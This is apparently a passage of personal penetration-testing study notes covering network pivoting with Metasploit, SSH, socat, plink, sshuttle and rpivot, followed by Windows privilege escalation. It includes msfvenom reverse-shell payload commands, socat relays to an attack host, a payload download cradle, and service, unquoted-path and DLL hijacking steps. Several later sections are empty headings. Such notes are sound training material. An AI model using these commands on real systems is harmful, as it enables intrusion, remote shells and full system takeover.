We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

Ping Sweep For Loop on Linux Pivot Hosts
example:
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
Ping Sweep For Loop Using CMD
example:
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Ping Sweep Using PowerShell
example:
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. 


There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
example:
```
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
```
Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

obs: in meterpreter on metasploit
example:
```
background 
use post/multi/manage/autoroute
set SESSION 1
set SUBNET  172.16.6.0
set NETMASK 24
run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
example:
```
run autoroute -s 172.16.5.0/23
```

After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
example:
```
run autoroute -p
```

We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
example:
```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

Port Forwarding
Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
```
help portfwd
```
```
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

Creating Local TCP Relay
example:
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3300 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

Connecting to Windows Target through localhost
example:
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Netstat Output
We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
example:
```
netstat -antp
```

Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
example:
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.


### sshuttle
Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
```
https://github.com/sshuttle/sshuttle
```

### chisel
A fast TCP/UDP tunnel over HTTP 
```
https://github.com/jpillora/chisel
```

### Dynamic Port Forwarding with SSH and SOCKS Tunneling
we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
```
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```
The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.
  
Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.
```
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. 
```
ssh -D 9050 ubuntu@10.129.202.64
```

The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

To inform proxychains that we must use port 1080/9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 1080/9050 to the last line if it is not already there.

Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 1080/9050, where our SSH client is listening, which will forward all the packets over SSH to the x.x.x.x./23 network.

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

Using Metasploit with Proxychains

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
```
proxychains msfconsole
```
Let's use the rdp_scanner auxiliary module to check if the host on the internal network is listening on 3389.
```
search rdp_scanner
```

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For example, we can log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. 

### Remote-Reverse Port Forwarding with SSH
We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well.

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

Transferring Payload to Pivot Host
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:/backupscript.exe  
```

Starting Python3 Webserver on Pivot Host

After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

```
python3 -m http.server 8123
```

We can download this backupscript.exe from the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
```
Invoke-WebRequest -Uri "http://<ip>:<port>/backupscript.exe" -OutFile "C:\backupscript.exe"
```


Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

## Socat Redirection with a Reverse Shell 

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.

Starting Socat Listener

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Creating the Windows Payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.


## Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. 

We can create a bind shell using msfvenom with the below command.

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```


We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)


## SSH for Windows plink exe

Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
```
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
```
https://www.putty.org/
```

Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer. 

That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.


The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

Using Plink.exe
```
plink -D 9050 ubuntu@10.129.15.50
```

Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

```
https://www.proxifier.com/
```

After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.


port 2805 is an example:
```
echo y|&./plink -R 2805:127.0.0.1:2805 -l <your username> -pw <your passwd> <your ip>
```
  
obs: make sure your ssh is open/started
```
sudo systemctl start ssh
```
the echo y is required the first time we run plink to tell it to accept the
ssh key of the server. The -R 2805:127.0.0.1:2805 is necessary to
bypass the local firewall and access veeam from your attacker
machine.
  
  
## SSH Pivoting with Sshuttle

Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts.
```
sudo apt-get install sshuttle
```
```
https://github.com/sshuttle/sshuttle
```


To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.


We can now use any tool directly without using proxychains.


## Web Server Pivoting with Rpivot
```
https://github.com/klsecservices/rpivot
```
Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

Cloning rpivot
```
sudo git clone https://github.com/klsecservices/rpivot.git
```
```
sudo git clone https://github.com/klsecservices/rpivot.git
```

Installing Python2.7
```
sudo apt-get install python2.7
```


We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```


Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
```
scp -r rpivot <user>@<IpaddressOfTarget>:/home/<user>/
```

Running client.py from Pivot Target
```
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which for an example is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

Browsing to the Target Webserver using Proxychains
```
proxychains firefox-esr 172.16.5.135:80
```


Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
 
-------------------------------------------------------------------------------------

## Local Privilige Escalation
in this part we will use different systems for different part of an attack. 

if a command start with # its from a linux/kali machine. 
if a commmand start with > its from a windows machine but mostly from cmd 
and if a command start with PS> its from a powershell in windows
```
# = linux/kali
> = windows/cmd
PS> = windwos poershell
```
#### Genereal Concepts

Our goal in privilege escalation in windows is to gain a shell running as an administrator or the system user. 

priv esc can be simpåle as an kernel exploit or it need alot of reconnaissance on the compromised system. 

in alot of cases priv esc may not simply rely on a single misconfiguration, but may require you to think and combine multiple misconfigurations. 

All priv esc are effectively examples of access control violations.

access control and users permission are intrisically linked.

when focusing on priv esc in windows, understanding how windows handles permissions is very important. 


### understanding permissions in windows

#### user accounts
user accounts are used to login into a win system. 

think of a user account as a collection of settings / preferences bound to unique identity.

the local administrator account is ccreated by default at installation. 

several other default user accounts may exist (e.g. Guest) depending on the version of windows. 

#### service accounts
service accounts are (somewhat obviusly) used to run services in wind.

service accounts cannot be used to sign in into a win system. 

the system account is a default service account which has the highest privilege of any local account in win. 

other default service accounts include "network service" and "local service". 

#### groups
user accounts can belong to multiple groups, and groups can have multiple users.

goups allow for easier access control to resources. 

regular groups (e.g. administrators, users) have a set list of members. 

pseudo groups (e.g. "authenticated users") have a dynamic list of members which changes based on certain interactins. 

#### windows resources
in windwos, there are multiple types of resources (also known as objetcs):
* Files /directories 
* Registry entries
* services 

wheter a user and/or group has permission to perfom a certion action on a resource depends on that resource's access control list (ACL) 


#### ACLs and ACEs
permissions to access a certain resource in windows are controlled by the access controll list (ACL) for that resource.

each ACL is made up tp zero or more access control entries (ACEs)

each ACE defiuned the relationsship between a principal (e.g. a user, group) and a certain access right. 

![image](https://user-images.githubusercontent.com/24814781/183662541-f43e36ae-8b7f-4bdf-9c1a-f928de1ed753.png)

#### spawning administrator shells
there a couple of reliable to spawn a administrator shells in windows. 

a couple of examples will be talked about below. 

### msfvenom
if we can execute commands with admnin privileges, a reverse shell generated by msfvenom works nicely

example:
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
```
this reverse shell can be caught using netcat or metasploits own multi/handler

if you want to escalate from and admin user to full SYSTEM privileges, you can use the PsExec tool from windows sysinternals.
```
https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
```
```
> .\PsExec64.exe -accepteula -i -s <path to example your msfvenom shell.exe> 
```

### example:
![image](https://user-images.githubusercontent.com/24814781/183664949-7ed7f211-2329-48dd-923f-329e30ba530a.png)
![image](https://user-images.githubusercontent.com/24814781/183665223-1abb2aa0-74bf-483e-a1da-cdeb01ecac47.png)
![image](https://user-images.githubusercontent.com/24814781/183665269-d9f37d7d-b03b-4322-8979-b535edc7b450.png)

#### RDP 

alternatively, if RDP is available (or we can enable it), we can add our low privilege user to the administrators group and then spawn an administrator command prompt via the GUI
```
> net localgroup administrators <sername> /add
```


### Privilege Escalation Tools
tools allow us to automate the reconnaisance that can identify potential privilege escalations. 

while it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam. 
  
in this part we will mostly be using winpeas and seatbelt, there also some demo for powerup and sharpup, however you are free to experiment woth other tools and decide wich you like. 

#### PowerUpp and SharpUp

PowerUp & SharpUp are very similar tools that hunt for specific privilege
escalation misconfigurations.

note: they are very limited enumeration tools, they try to find a sub-set of priv esc methods and are usualy very good at it but should not be the only tools you use. 

PowerUp:
```
https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/mast
er/PowerUp/PowerUp.ps1
```

SharpUp: 
```
https://github.com/GhostPack/SharpUp
```

Pre-Compiled SharpUp: 
```
https://github.com/r3motecontrol/Ghostpack-
CompiledBinaries/blob/master/SharpUp.exe
```
  
#### PowerUp
to run PowerUp you first need a powershell session. 
```
> powershell -exec bypass
```
then: 
```
PS> . .\PowerUp.ps1
```
and lastly:
```
Invoke-Allchecks
```
PowerUp also have a number of exploit functions, wich can be used to perform the actuall priv esc but we will in this part be doing it manualy but its a good thing to remember. 

#### SharpUp
we can run SharpUp either from a poaershell session or cmd. 
```
.\SharpUp.exe
```
the output is similar to PowerUp.

#### seabelt

Seatbelt is an enumeration tool. It contains a number of enumeration
checks.
It does not actively hunt for privilege escalation misconfigurations, but
provides related information for further investigation.

obs: unlike PowerUp and SharpUp, by default it will output alot of info about the system

Code: 
```
https://github.com/GhostPack/Seatbelt
```

Pre-Compiled: 
```
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
```

execute seatbelt with no options it will print out the help text
  
if you run seatbelt with the flag "all" it will run all enumeration checks
```
.\SeatBelt.exe all
```

#### Winpeas
winPEAS is a very powerful tool that not only actively
hunts for privilege escalation misconfigurations, but
highlights them for the user in the results.
```
https://github.com/carlospolop/privilege-escalation-
awesome-scripts-suite/tree/master/winPEAS
```

if possible write this and then open up a new cmd
```
add HKCU\console /v VirtualTerminalLevel /t REG_DWORD /d 1 
```
open up a new cmd and start it 
```
.\winpeas.sh
```
obs: we do this because we enable colors wich makes it easier to find missconfoguration. 

if you cant add the registration key you may still being able to view colors by running the script in a reverse shell on a kali machin. 

winpeas runns a number of checks in different categories but not specifying any will execute all the checks. 


#### accesschk
AccessChk is an old but still trustworthy tool for checking user access
control rights.
You can use it to check whether a user or group has access to files,
directories, services, and registry keys.
The downside is more recent versions of the program spawn a GUI
“accept EULA” popup window. When using the command line, we have
to use an older version which still has an /accepteula command line
option.

## Privilege Escalation Techniques

### Kernel Exploits
#### What is a Kernel?
Kernels are the core of any operating system.
Think of it as a layer between application software and the
actual computer hardware.

The kernel has complete control over the operating system.
Exploiting a kernel vulnerability can result in execution as the
SYSTEM user.

#### Finding Kernel Exploits

Finding and using kernel exploits is usually a simple process:

1. Enumerate Windows version / patch level (systeminfo).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run.

Beware though, as Kernel exploits can often be unstable and
may be one-shot or cause a system crash.


Tools
Windows Exploit Suggester:
```
https://github.com/bitsadmin/wesng
```

Precompiled Kernel Exploits:
```
https://github.com/SecWiki/windows-kernel-exploits
```
Watson:
```
https://github.com/rasta-mouse/Watson
```

### Privilege Escalation

(Note: These steps are for Windows 7)
1.Extract the output of the systeminfo command:
```
> systeminfo > systeminfo.txt
```
2.Run wesng to find potential exploits:
```
# python wes.py systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less
```
3.Cross-reference results with compiled exploits:
https://github.com/SecWiki/windows-kernel-exploits

4.Download the compiled exploit for <whatever CVE or exploit it found> but for this demo we use the CVE-2018-8210 and put it onto the Windows VM:
```
https://github.com/SecWiki/windows-
kernel-exploits/blob/master/CVE-2018-8120/x64.exe
```

5.Start a listener on Kali and run the exploit, providing it
with the reverse shell executable, which should run with
SYSTEM privileges:
```
> .\x64.exe C:\PrivEsc\reverse.exe
```

### Service Exploits
### Services

  Services are simply programs that run in the
background, accepting input or performing regular
tasks.

If services run with SYSTEM privileges and are
misconfigured, exploiting them may lead to command
execution with SYSTEM privileges as well.

the following commands are usefull when dealing with services.

Service Commands
Query the configuration of a service:
``´
> sc.exe qc <name>
```
Query the current status of a service:
```
> sc.exe query <name>
```
Modify a configuration option of a service:
```
> sc.exe config <name> <option>= <value>
```
Start/Stop a service:
```
> net start/stop <name>
```


#### Service Misconfigurations
  
1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking


### Insecure Service Permissions

Each service has an ACL which defines certain service-specific
permissions.

Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,
SERVICE_QUERY_STATUS).

Some may be useful (e.g. SERVICE_STOP, SERVICE_START).

Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,
SERVICE_ALL_ACCESS)


#### Insecure Service Permissions

If our user has permission to change the configuration of a
service which runs with SYSTEM privileges, we can change
the executable the service uses to one of our own.

Potential Rabbit Hole: If you can change a service
configuration but cannot stop/start the service, you may not
be able to escalate privileges!

Privilege Escalation
example:
1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that we can modify the “daclsvc” service.

3.We can confirm this with accesschk.exe:
```
> .\accesschk.exe /accepteula -uwcqv user daclsvc
```
4.Check the current configuration of the service:
```
> sc qc daclsvc
```

5.Check the current status of the service:
```
> sc query daclsvc
```
6.Reconfigure the service to use our reverse shell executable:
```
> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
7.Start a listener on Kali, and then start the service to trigger the
exploit:
```
> net start daclsvc
```

#### Unquoted Service Path
Executables in Windows can be run without using their
extension (e.g. “whoami.exe” can be run by just typing
“whoami”).

Some executables take arguments, separated by spaces, e.g.
someprog.exe arg1 arg2 arg3...

This behavior leads to ambiguity when using absolute paths
that are unquoted and contain spaces.


Consider the following unquoted path:
C:\Program Files\Some Dir\SomeProgram.exe

To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”

Windows resolves this ambiguity by checking each of the possibilities in turn.

If we can write to a location Windows checks before the actual executable, we
can trick the service into executing it instead.


#### Privilege Escalation

1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the “unquotedsvc” service has an unquoted path that
also contains spaces:
```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
3.Confirm this using sc:
```
> sc qc unquotedsvc
```


4.Use accesschk.exe to check for write permissions:
```
> .\accesschk.exe /accepteula -uwdq C:\
```
```
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
```
```
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
5.Copy the reverse shell executable and rename it appropriately:
```
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
6.Start a listener on Kali, and then start the service to trigger the exploit:
```
> net start unquotedsvc
```

####Weak Registry Permissions

The Windows registry stores entries for each service.
Since registry entries can have ACLs, if the ACL is
misconfigured, it may be possible to modify a service’s
configuration even if we cannot modify the service
directly.

Privilege Escalation

1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the “regsvc” service has a weak registry entry. We can confirm this with
PowerShell:
```
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

3.Alternatively accesschk.exe can be used to confirm:
```
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

#### Insecure Service Executables

If the original service executable is modifiable by our
user, we can simply replace it with our reverse shell
executable.

Remember to create a backup of the original executable
if you are exploiting this in a real system!

#### Privilege Escalation

1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the “filepermsvc” service has an executable which appears to be

writable by everyone. We can confirm this with accesschk.exe:
```
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
3.Create a backup of the original service executable:
```
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```
4.Copy the reverse shell executable to overwrite the service
executable:
```
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```
5.Start a listener on Kali, and then start the service to trigger the
exploit:
```
> net start filepermsvc
```

#### DLL Hijacking

Often a service will try to load functionality from a library
called a DLL (dynamic-link library). Whatever functionality the
DLL provides, will be executed with the same privileges as the
service that loaded it.

If a DLL is loaded with an absolute path, it might be possible
to escalate privileges if that DLL is writable by our user.


A more common misconfiguration that can be used to
escalate privileges is if a DLL is missing from the system,
and our user has write access to a directory within the
PATH that Windows searches for DLLs in.

Unfortunately, initial detection of vulnerable services is
difficult, and often the entire process is very manual.

#### Privilege Escalation

1.Use winPEAS to enumerate non-Windows services:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the C:\Temp directory is writable and in the PATH. Start by
enumerating which of these services our user has stop and start access to:
```
> .\accesschk.exe /accepteula -uvqc user dllsvc
```
3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the
winPEAS output, the service runs the dllhijackservice.exe executable. We
can confirm this manually:
```
> sc qc dllsvc
```
4.Run Procmon64.exe with administrator privileges. Press
Ctrl+L to open the Filter menu.

5.Add a new filter on the Process Name matching
dllhijackservice.exe.

6.On the main screen, deselect registry activity and
network activity.

7.Start the service:
```
> net start dllsvc
```
8.Back in Procmon, note that a number of “NAME NOT
FOUND” errors appear, associated with the hijackme.dll file.

9.At some point, Windows tries to find the file in the C:\Temp
directory, which as we found earlier, is writable by our user.

10. On Kali, generate a reverse shell DLL named hijackme.dll:
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
```
11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
listener on Kali and then stop/start the service to trigger the exploit:
```
> net stop dllsvc
```
```
> net start dllsvc
```


### Registry exploits

### passwords

### scheduled tasks

### insecure GUI apps

### startup apps

### installed apps

### hot potato

### token impersonation

### port forwarding

### privilege escalation strategy

### getsystem Named Pipes and Token Duplication

### user privileges

-------------------------------------------------------------------------------------

## AD focused Privilige Escalation and enumeration

![image](https://user-images.githubusercontent.com/24814781/181489538-3f33d6f4-1a7b-4933-a8dd-3d4958aabf14.png)


### resources
here is some basic resources about privilige escalation and enumeration to start with. 

```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
```
```
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
```

### basic  

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.

always start checking this two commands: 
```
whoami /priv
```
```
whoami /all
```

you can search in the user folder and automate every folder in the users folder and beyond:
```
gci -recurse .
```
obs: dont forget the dot since it says from the folder you are on etc. 

use the same command to search for hidden files:
```
cgi -hidden .
```
you can then after look for files etc under the root folder (C:\ drive) then the same on /temp folder

then go scan with seatbelt, winpeas and PrivescCheck then go over to enum with powerview.

### powerview
its in the powersploit github but donwload here:
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

#### resources
```
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```
```
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
```
```
https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet
```
  
### WES NG Windows Exploit Suggester the Next Generation

